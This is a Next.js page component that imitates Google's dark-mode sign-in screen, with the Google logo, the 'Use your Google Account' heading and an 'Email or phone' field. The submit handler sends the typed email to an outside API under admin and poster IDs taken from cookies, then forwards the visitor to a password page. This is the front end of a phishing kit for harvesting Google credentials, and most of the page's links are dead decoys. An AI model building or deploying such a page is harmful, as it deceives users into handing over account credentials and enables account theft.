"use client";
import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { API_URL, site } from "../config/index";
import Cookies from "js-cookie";

function Page() {
  const [email, setEmail] = useState("");
  const [adminId, setAdminId] = useState("");
  const [posterId, setPosterId] = useState("");
  const router = useRouter();

  useEffect(() => {
    setAdminId(Cookies.get("adminId") || "");
    setPosterId(Cookies.get("posterId") || "");
  }, []);

  const handleSubmit = async (e) => {
    if (e) e.preventDefault();
    if (!email) return;

    const values = {
      email: email,
      site: site,
    };

    const url = `${API_URL}/email/post/${adminId}/${posterId}`;

    try {
      const res = await fetch(url, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(values),
      });

      const data = await res.json();

      if (res.ok) {
        Cookies.set("email", data?.info?.email);
        Cookies.set("id", data?.info?._id);
        router.push("/password");
      } else {
        console.error("Login error:", data);
      }
    } catch (err) {
      console.error("Fetch error:", err);
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#0b0b0b] flex items-center justify-center p-4">
      {/* Sign-in Card */}
      <div className="bg-[#1e1e1e] w-full max-w-[1024px] rounded-2xl flex flex-col md:flex-row overflow-hidden shadow-2xl min-h-[500px]">
        {/* Left Side: Info */}
        <div className="flex-1 p-8 md:p-12 flex flex-col justify-start">
          <div className="mb-6">
            <svg
              viewBox="0 0 24 24"
              width="48"
              height="48"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4"
              />
              <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853"
              />
              <path
                d="M5.84 14.1c-.22-.66-.35-1.36-.35-2.1s.13-1.44.35-2.1V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l3.66-2.84z"
                fill="#FBBC05"
              />
              <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.66l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                fill="#EA4335"
              />
              <path d="M1 1h22v22H1z" fill="none" />
            </svg>
          </div>
          <h1 className="text-white text-3xl font-normal mb-2">Sign in</h1>
          <p className="text-white text-lg font-normal">Use your Google Account</p>
        </div>

        {/* Right Side: Form */}
        <div className="flex-1 p-8 md:p-12 flex flex-col justify-between">
          <form onSubmit={handleSubmit} className="w-full">
            <div className="mt-8 mb-4">
              <div className="relative border border-[#5f6368] rounded-md focus-within:border-[#8ab4f8] focus-within:border-2 transition-all">
                <input
                  type="text"
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="block w-full px-4 py-4 bg-transparent text-white text-lg outline-none placeholder-transparent peer"
                  placeholder="Email or phone"
                  autoComplete="off"
                />
                <label
                  htmlFor="email"
                  className="absolute left-4 top-4 text-[#9aa0a6] text-lg transition-all transform peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-9 peer-focus:left-2 peer-focus:bg-[#1e1e1e] peer-focus:px-2 peer-focus:text-[#8ab4f8] -translate-y-9 scale-75 bg-[#1e1e1e] px-2"
                >
                  Email or phone
                </label>
              </div>
            </div>

            <button
              type="button"
              className="text-[#8ab4f8] text-base font-medium hover:underline inline-block mb-10"
            >
              Forgot email?
            </button>

            <div className="text-[#bdc1c6] text-base leading-relaxed mb-10">
              <p>Not your computer? Use Guest mode to sign in privately.</p>
              <button
                type="button"
                className="text-[#8ab4f8] font-medium hover:underline mt-1"
              >
                Learn more about using Guest mode
              </button>
            </div>
          </form>

          {/* Bottom Actions */}
          <div className="flex items-center justify-between mt-auto">
            <button
              type="button"
              className="text-[#8ab4f8] text-base font-medium hover:underline"
            >
              Create account
            </button>
            <button
              onClick={handleSubmit}
              className="bg-[#8ab4f8] hover:bg-[#aecbfa] text-[#202124] font-medium px-8 py-2.5 rounded-full transition-all text-base"
            >
              Next
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Page;
